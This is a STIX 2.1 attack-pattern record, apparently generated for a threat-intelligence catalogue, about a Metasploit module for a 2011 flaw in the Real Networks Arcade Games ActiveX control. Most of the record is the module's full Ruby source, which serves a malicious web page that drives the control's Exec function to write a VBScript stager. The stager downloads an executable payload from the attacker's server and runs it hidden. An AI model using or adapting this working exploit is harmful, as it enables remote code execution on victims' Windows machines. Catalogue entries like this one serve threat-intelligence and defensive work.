{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cde88750-53bf-486e-99ed-4e4aa6e2c54b",
    "created": "2024-08-14T16:44:48.438635Z",
    "modified": "2024-08-14T16:44:48.438639Z",
    "name": "Real Networks Arcade Games StubbyUtil.ProcessMgr ActiveX Arbitrary Code Execution",
    "description": " This module exploits a vulnerability in Real Networks Arcade Game's ActiveX control. The \"exec\" function found in InstallerDlg.dll (v2.6.0.445) allows remote attackers to run arbitrary commands on the victim machine.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/real_arcade_installerdlg.rb",
            "external_id": "real_arcade_installerdlg.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Real Networks Arcade Games StubbyUtil.ProcessMgr ActiveX Arbitrary Code Execution',\n      'Description'    => %q{\n          This module exploits a vulnerability in Real Networks Arcade Game's ActiveX control. The \"exec\"\n        function found in InstallerDlg.dll (v2.6.0.445) allows remote attackers to run arbitrary commands\n        on the victim machine.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n          [\n            'rgod',    #Initial discovery, poc\n            'sinn3r',  #msf\n          ],\n      'References'     =>\n        [\n          [ 'OSVDB', '71559' ],\n          [ 'EDB', '17105' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows Universal',  {} ],\n        ],\n      'DisclosureDate' => '2011-04-03',\n      'DefaultTarget'  => 0))\n  end\n\n  # Unfortunately if we echo the vbs cmdstager too many times, we tend to have random missing lines in\n  # either the payload or the vbs script.  To avoid this problem, I ended up writing this custom routine\n  # that only uses one echo.\n  def build_vbs(url, payload_name, stager_name)\n    name_xmlhttp = rand_text_alpha(2)\n    name_adodb   = rand_text_alpha(2)\n\n    tmp = \"#{@temp_folder}/#{stager_name}\"\n\n    vbs  = \"echo Set #{name_xmlhttp} = CreateObject(\\\"\\\"Microsoft.XMLHTTP\\\"\\\") \"\n    vbs << \": #{name_xmlhttp}.open \\\"\\\"GET\\\"\\\",\\\"\\\"http://#{url}\\\"\\\",False : #{name_xmlhttp}.send\"\n    vbs << \": Set #{name_adodb} = CreateObject(\\\"\\\"ADODB.Stream\\\"\\\") \"\n    vbs << \": #{name_adodb}.Open : #{name_adodb}.Type=1 \"\n    vbs << \": #{name_adodb}.Write #{name_xmlhttp}.responseBody \"\n    vbs << \": #{name_adodb}.SaveToFile \\\"\\\"#{@temp_folder}/#{payload_name}.exe\\\"\\\",2 \"\n    vbs << \": CreateObject(\\\"\\\"WScript.Shell\\\"\\\").Run \\\"\\\"#{@temp_folder}/#{payload_name}.exe\\\"\\\",0 >> #{tmp}\"\n\n    return vbs\n  end\n\n  def exploit\n    @payload_name = rand_text_alpha(4)\n    @temp_folder  = \"C:/Windows/Temp\"\n    super\n  end\n\n  def on_request_uri(cli, request)\n    if request.uri =~ /\\.exe/\n      print_status(\"Sending payload EXE\")\n      return if ((p=regenerate_payload(cli)) == nil)\n      data = generate_payload_exe( {:code=>p.encoded} )\n      send_response(cli, data, {'Content-Type' => 'application/octet-stream'} )\n      return\n    end\n\n    # Payload's URL\n    payload_src  = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    payload_src << \":#{datastore['SRVPORT']}#{get_resource}/#{@payload_name}.exe\"\n\n    # Create the stager (download + execute payload)\n    stager_name = rand_text_alpha(6) + \".vbs\"\n    stager      = build_vbs(payload_src, @payload_name, stager_name)\n\n    html_obj_name = rand_text_alpha(6)\n\n    html = <<-EOS\n    <html>\n    <object classid='clsid:5818813E-D53D-47A5-ABBB-37E2A07056B5' id='#{html_obj_name}' />\n    </object>\n    <script language='vbscript'>\n    #{html_obj_name}.Exec \"cmd\",\"/c #{stager}\",1,1,\"\"\n    setTimeout \"x=1\", 3000\n    #{html_obj_name}.Exec \"cmd\",\"/c start #{@temp_folder}/#{stager_name}\",1,1,\"\"\n    </script>\n    </html>\n    EOS\n\n    # Remove extra tabs\n    html = html.gsub(/^ {4}/, \"\")\n\n    print_status(\"Sending #{self.name}\")\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-04-03",
    "x_mitre_platforms": [
        "win'"
    ]
}